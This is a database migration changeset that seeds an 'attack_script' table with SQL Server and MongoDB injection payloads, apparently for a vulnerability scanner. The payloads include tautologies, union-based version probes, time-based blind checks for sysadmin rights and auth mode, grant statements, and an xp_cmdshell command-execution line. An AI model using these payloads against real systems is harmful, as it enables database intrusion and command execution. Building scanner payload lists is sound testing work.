changeSet.author: user
changeSet.sql: INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '; --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"' --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"'); --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"'; exec master..xp_cmdshell "'ping 10.10.1.2"'--');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"' grant connect to name; grant resource to name; --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"' or 1=1 --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"' union (select @@version) --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"' union (select NULL, (select @@version)) --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"' union (select NULL, NULL, (select @@version)) --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"' union (select NULL, NULL, NULL, (select @@version)) --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"' union (select NULL, NULL, NULL, NULL, (select @@version)) --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"' union (select NULL, NULL, NULL, NULL, NULL, (select @@version)) --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"'; if not(substring((select @@version),25,1) <> 0) waitfor delay "'0:0:2"' --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"'; if not(substring((select @@version),25,1) <> 5) waitfor delay "'0:0:2"' --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"'; if not(substring((select @@version),25,1) <> 8) waitfor delay "'0:0:2"' --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"'; if not(substring((select @@version),24,1) <> 1) waitfor delay "'0:0:2"' --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"'; if not(select system_user) <> "'sa"' waitfor delay "'0:0:2"' --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"'; if is_srvrolemember("'sysadmin"') > 0 waitfor delay "'0:0:2"' -- ');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"'; if not((select serverproperty("'isintegratedsecurityonly"')) <> 1) waitfor delay "'0:0:2"' --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"'; if not((select serverproperty("'isintegratedsecurityonly"')) <> 0) waitfor delay "'0:0:2"' --"');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '1"'1');

INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '1');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '1 and user_name() = "'dbo"'');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '\"'; desc users; --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '1\""'1');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '1"' and non_existant_table = "'1');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"' or username is not NULL or username = "'');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '1 and ascii(lower(substring((select top 1 name from sysobjects where xtype="'u"'), 1, 1))) > 116');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = "'u"' --');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '1 uni/**/on select all from where');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, 'true, $where: "'1 == 1"'');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, ', $where: "'1 == 1"'');

INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '{ $ne: 1 }');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, '"', $or: [ {}, { "'a"':"'a');

INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, 'db.injection.insert({success:1});');
INSERT INTO attack_script(attack_id, severity_id, attack_script) VALUES (1, 2, 'db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1');
